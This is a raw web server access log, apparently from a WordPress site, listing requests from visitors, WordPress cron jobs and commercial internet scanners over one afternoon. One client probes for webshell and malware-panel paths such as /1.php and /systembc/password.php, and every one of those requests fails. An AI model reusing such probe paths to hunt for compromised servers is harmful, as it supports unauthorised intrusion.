204.188.228.75 - - [04/Mar/2025:12:21:49 +0800] "GET /geoip/ HTTP/1.1" 404 409 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
204.188.228.75 - - [04/Mar/2025:12:21:49 +0800] "GET /favicon.ico HTTP/1.1" 404 409 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
204.188.228.75 - - [04/Mar/2025:12:21:50 +0800] "GET /1.php HTTP/1.1" 404 409 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
204.188.228.75 - - [04/Mar/2025:12:21:50 +0800] "GET /systembc/password.php HTTP/1.1" 404 409 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
204.188.228.75 - - [04/Mar/2025:12:21:50 +0800] "GET /password.php HTTP/1.1" 404 409 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.94.145.97 - - [04/Mar/2025:12:22:16 +0800] "GET / HTTP/1.1" 301 5 "-" "-"
167.94.145.97 - - [04/Mar/2025:12:22:30 +0800] "GET / HTTP/1.1" 200 17031 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.97 - - [04/Mar/2025:12:22:31 +0800] "GET /favicon.ico HTTP/1.1" 404 409 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.97 - - [04/Mar/2025:12:22:37 +0800] "GET /favicon.ico HTTP/1.1" 404 409 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
193.68.89.10 - - [04/Mar/2025:12:40:18 +0800] "GET / HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
124.71.151.239 - - [04/Mar/2025:13:04:23 +0800] "POST /wp-cron.php?doing_wp_cron=1741064663.8299241065979003906250 HTTP/1.1" 200 31 "-" "WordPress/6.7.2; http://124.71.151.239"
35.203.211.24 - - [04/Mar/2025:13:04:24 +0800] "GET /wp-login.php HTTP/1.1" 200 7716 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
1.34.145.215 - - [04/Mar/2025:13:16:41 +0800] "GET / HTTP/1.0" 301 0 "-" "curl/7.88.1"
124.71.151.239 - - [04/Mar/2025:13:53:20 +0800] "POST /wp-cron.php?doing_wp_cron=1741067600.2186510562896728515625 HTTP/1.1" 200 31 "-" "WordPress/6.7.2; http://124.71.151.239"
204.76.203.15 - - [04/Mar/2025:13:53:20 +0800] "GET / HTTP/1.1" 200 17031 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
43.135.155.240 - - [04/Mar/2025:14:15:53 +0800] "GET / HTTP/1.1" 200 17031 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
182.90.207.21 - - [04/Mar/2025:14:38:33 +0800] "GET / HTTP/1.1" 200 17031 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
